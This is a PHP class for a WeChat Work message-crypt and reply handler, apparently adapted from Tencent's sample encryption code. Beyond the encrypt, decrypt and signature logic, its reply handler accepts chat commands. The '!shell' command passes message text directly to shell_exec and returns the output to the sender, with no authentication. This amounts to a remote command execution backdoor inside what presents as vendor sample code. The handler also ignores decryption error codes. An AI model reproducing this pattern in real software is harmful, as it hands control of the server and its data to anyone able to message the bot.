<?php
namespace Souii\WeiXinQiYe;
/**
 * 对公众平台发送给公众账号的消息加解密示例代码.
 *
 * @copyright Copyright (c) 1998-2014 Tencent Inc.
 */


use Phalcon\Mvc\User\Component;
use Souii\Redis\RedisUtils;

include_once "sha1.php";
include_once "xmlparse.php";
include_once "pkcs7Encoder.php";
include_once "errorCode.php";

/**
 * 1.第三方回复加密消息给公众平台；
 * 2.第三方收到公众平台发送的消息，验证消息的安全性，并对消息进行解密。
 */
class WXBizMsgCrypt extends Component
{

    /**
     * 接受消息类型
     */
    const MSG_TYPE_TEXT = 'text';
    const MSG_TYPE_IMAGE = 'image';
    const MSG_TYPE_VOICE = 'voice';
    const MSG_TYPE_VIDEO = 'video';
    const MSG_TYPE_SHORT_VIDEO = 'shortvideo';
    const MSG_TYPE_LOCATION = 'location';
    const MSG_TYPE_EVENT = 'event';

    /**
     * 接收事件类型
     */
    const MSG_ENENT_SUBSCRIBE = "subscribe";
    const MSG_ENENT_UNSUBSCRIBE = "unsubscribe";
    const MSG_ENENT_LOCATION = "LOCATION";
    const MSG_ENENT_CLICK = "CLICK";
    const MSG_ENENT_VIEW = "VIEW";
    const MSG_ENENT_SCANCODE_PUSH = "scancode_push";
    const MSG_ENENT_SCANCODE_WAITMSG = "scancode_waitmsg";
    const MSG_ENENT_PIC_SYSPHOTO = "pic_sysphoto";
    const MSG_ENENT_PIC_PHOTO_OR_ALBUM = "pic_photo_or_album";
    const MSG_ENENT_PIC_WEIXIN = "pic_weixin";
    const MSG_ENENT_LOCATION_SELECT = "location_select";
    const MSG_ENENT_ENTER_AGENT = "enter_agent";
    const MSG_ENENT_BATCH_JOB_RESULT = "batch_job_result";



    /**
     * 回复消息类型
     */
    const REPLY_MSG_TYPE_TEXT = 'text';
    const REPLY_MSG_TYPE_IMAGE = 'image';
    const REPLY_MSG_TYPE_VOICE = 'voice';
    const REPLY_MSG_TYPE_VIDEO = 'video';
    const REPLY_MSG_TYPE_NEWS = 'news';


	private $m_sToken;
	private $m_sEncodingAesKey;
	private $m_sCorpid;

    public static $command = array(
        '!help'=>'帮助',
        '!enterCMD' => '进如命令模式',
        '!exitCMD' => '退出命令模式',
        '!shell' => '控制台命令'
    );
    /**
     * 构造函数
     * @param $token string 公众平台上，开发者设置的token
     * @param $encodingAesKey string 公众平台上，开发者设置的EncodingAESKey
     * @param $Corpid string 公众平台的Corpid
     */
    public function __construct()
    {
        $this->m_sToken = $this->config->thirdpart->weixinqiye['token'];
        $this->m_sEncodingAesKey = $this->config->thirdpart->weixinqiye['encodingAesKey'];
        $this->m_sCorpid = $this->config->thirdpart->weixinqiye['corpId'];
    }

    /*
	*验证URL
    *@param sMsgSignature: 签名串，对应URL参数的msg_signature
    *@param sTimeStamp: 时间戳，对应URL参数的timestamp
    *@param sNonce: 随机串，对应URL参数的nonce
    *@param sEchoStr: 随机串，对应URL参数的echostr
    *@param sReplyEchoStr: 解密之后的echostr，当return返回0时有效
    *@return：成功0，失败返回对应的错误码
	*/
	public function VerifyURL($sMsgSignature, $sTimeStamp, $sNonce, $sEchoStr, &$sReplyEchoStr)
	{
		if (strlen($this->m_sEncodingAesKey) != 43) {
			return ErrorCode::$IllegalAesKey;
		}

		$pc = new Prpcrypt($this->m_sEncodingAesKey);
		//verify msg_signature
		$sha1 = new SHA1;
		$array = $sha1->getSHA1($this->m_sToken, $sTimeStamp, $sNonce, $sEchoStr);
		$ret = $array[0];

		if ($ret != 0) {
			return $ret;
		}

		$signature = $array[1];
		if ($signature != $sMsgSignature) {
			return ErrorCode::$ValidateSignatureError;
		}

		$result = $pc->decrypt($sEchoStr, $this->m_sCorpid);
		if ($result[0] != 0) {
			return $result[0];
		}
		$sReplyEchoStr = $result[1];

		return ErrorCode::$OK;
	}
	/**
	 * 将公众平台回复用户的消息加密打包.
	 * <ol>
	 *    <li>对要发送的消息进行AES-CBC加密</li>
	 *    <li>生成安全签名</li>
	 *    <li>将消息密文和安全签名打包成xml格式</li>
	 * </ol>
	 *
	 * @param $replyMsg string 公众平台待回复用户的消息，xml格式的字符串
	 * @param $timeStamp string 时间戳，可以自己生成，也可以用URL参数的timestamp
	 * @param $nonce string 随机串，可以自己生成，也可以用URL参数的nonce
	 * @param &$encryptMsg string 加密后的可以直接回复用户的密文，包括msg_signature, timestamp, nonce, encrypt的xml格式的字符串,
	 *                      当return返回0时有效
	 *
	 * @return int 成功0，失败返回对应的错误码
	 */
	public function EncryptMsg($sReplyMsg, $sTimeStamp, $sNonce, &$sEncryptMsg)
	{
		$pc = new Prpcrypt($this->m_sEncodingAesKey);

		//加密
		$array = $pc->encrypt($sReplyMsg, $this->m_sCorpid);
		$ret = $array[0];
		if ($ret != 0) {
			return $ret;
		}

		if ($sTimeStamp == null) {
			$sTimeStamp = time();
		}
		$encrypt = $array[1];

		//生成安全签名
		$sha1 = new SHA1;
		$array = $sha1->getSHA1($this->m_sToken, $sTimeStamp, $sNonce, $encrypt);
		$ret = $array[0];
		if ($ret != 0) {
			return $ret;
		}
		$signature = $array[1];

		//生成发送的xml
		$xmlparse = new XMLParse;
		$sEncryptMsg = $xmlparse->generate($encrypt, $signature, $sTimeStamp, $sNonce);
		return ErrorCode::$OK;
	}


	/**
	 * 检验消息的真实性，并且获取解密后的明文.
	 * <ol>
	 *    <li>利用收到的密文生成安全签名，进行签名验证</li>
	 *    <li>若验证通过，则提取xml中的加密消息</li>
	 *    <li>对消息进行解密</li>
	 * </ol>
	 *
	 * @param $msgSignature string 签名串，对应URL参数的msg_signature
	 * @param $timestamp string 时间戳 对应URL参数的timestamp
	 * @param $nonce string 随机串，对应URL参数的nonce
	 * @param $postData string 密文，对应POST请求的数据
	 * @param &$msg string 解密后的原文，当return返回0时有效
	 *
	 * @return int 成功0，失败返回对应的错误码
	 */
	public function DecryptMsg($sMsgSignature, $sTimeStamp = null, $sNonce, $sPostData, &$sMsg)
	{
		if (strlen($this->m_sEncodingAesKey) != 43) {
			return ErrorCode::$IllegalAesKey;
		}

		$pc = new Prpcrypt($this->m_sEncodingAesKey);

		//提取密文
		$xmlparse = new XMLParse;
		$array = $xmlparse->extract($sPostData);
		$ret = $array[0];

		if ($ret != 0) {
			return $ret;
		}

		if ($sTimeStamp == null) {
			$sTimeStamp = time();
		}

		$encrypt = $array[1];
		$touser_name = $array[2];

		//验证安全签名
		$sha1 = new SHA1;
		$array = $sha1->getSHA1($this->m_sToken, $sTimeStamp, $sNonce, $encrypt);
		$ret = $array[0];

		if ($ret != 0) {
			return $ret;
		}

		$signature = $array[1];
		if ($signature != $sMsgSignature) {
			return ErrorCode::$ValidateSignatureError;
		}

		$result = $pc->decrypt($encrypt, $this->m_sCorpid);
		if ($result[0] != 0) {
			return $result[0];
		}
		$sMsg = $result[1];

		return ErrorCode::$OK;
	}

    /**
     * 回复消息
     * @param $sMsg 解密后的用户xml格式消息
     */
    public function replayMsg(){
        $sReqMsgSig =$this->request->get('msg_signature');
        $sReqTimeStamp = $this->request->get('timestamp');
        $sReqNonce = $this->request->get('nonce');
        $sReqData = $this->request->getRawBody();

        $sMsg = "";  // 解析之后的明文
        $errCode = $this->weixinMsg->DecryptMsg($sReqMsgSig, $sReqTimeStamp, $sReqNonce, $sReqData, $sMsg);
        $xml = new \DOMDocument();
        $xml->loadXML($sMsg);
        $FromUserName = $xml->getElementsByTagName('FromUserName')->item(0)->nodeValue;
        $ToUserName = $xml->getElementsByTagName('ToUserName')->item(0)->nodeValue;
        $CreateTime = $xml->getElementsByTagName('CreateTime')->item(0)->nodeValue;
        $MsgType = $xml->getElementsByTagName('MsgType')->item(0)->nodeValue;

        if($MsgType == self::MSG_TYPE_EVENT){
            $this->logger->info($sMsg);

            $Event = $xml->getElementsByTagName('Event')->item(0)->nodeValue;
            $xpath = new \DOMXPath($xml);
            if($Event == self::MSG_ENENT_SCANCODE_WAITMSG){
                $ScanType = $xpath->query('/xml/ScanCodeInfo/ScanType')->item(0)->nodeValue;
                $ScanResult = $xpath->query('/xml/ScanCodeInfo/ScanResult')->item(0)->nodeValue;
                $this->logger->info("res================".$ScanResult);
                self::replyTextMsg($ToUserName,$FromUserName,$CreateTime,$ScanResult);
            }
        }else{
            $MsgId = $xml->getElementsByTagName('MsgId')->item(0)->nodeValue;
            if($MsgType == self::MSG_TYPE_TEXT){
                $content = $xml->getElementsByTagName('Content')->item(0)->nodeValue;
                $retMsg = $content;
                if(substr($content,0,1)=="!"&&@array_key_exists(explode(' ',$content)[0],self::$command)){
                    $retMsg = self::execCommand(explode(' ',$content)[0],$content);
                }
                self::replyTextMsg($ToUserName,$FromUserName,$CreateTime,$retMsg);
            }
        }
    }

    public static function execCommand($command,$param){
        $command = substr($command,1);
        return self::$command($param);
    }

    public static function help(){
        $msg = '';
        foreach(self::$command as $cmd => $val){
            $msg .= "$cmd : $val\n";
        }
        return $msg;
    }

    public static function shell($param){
        $shell = substr($param,7);
        return shell_exec($shell);
    }

    public static function enterCMD($param){
        return RedisUtils::$CACHEKEYS;
    }

    public function replyTextMsg($FromUserName,$ToUserName,$CreateTime,$text){
        $CreateTime = time();
        $sReqTimeStamp = $this->request->get('timestamp');
        $sReqNonce = $this->request->get('nonce');
        $sRespData = "<xml>
        <ToUserName><![CDATA[$ToUserName]]></ToUserName>
        <FromUserName><![CDATA[$FromUserName]]></FromUserName>
        <CreateTime>$CreateTime</CreateTime>
        <MsgType><![CDATA[".self::REPLY_MSG_TYPE_TEXT."]]></MsgType>
        <Content><![CDATA[$text]]></Content>
        </xml>";
        self::EncryptMsg($sRespData, $sReqTimeStamp, $sReqNonce, $sEncryptMsg);
        echo $sEncryptMsg;
    }
}

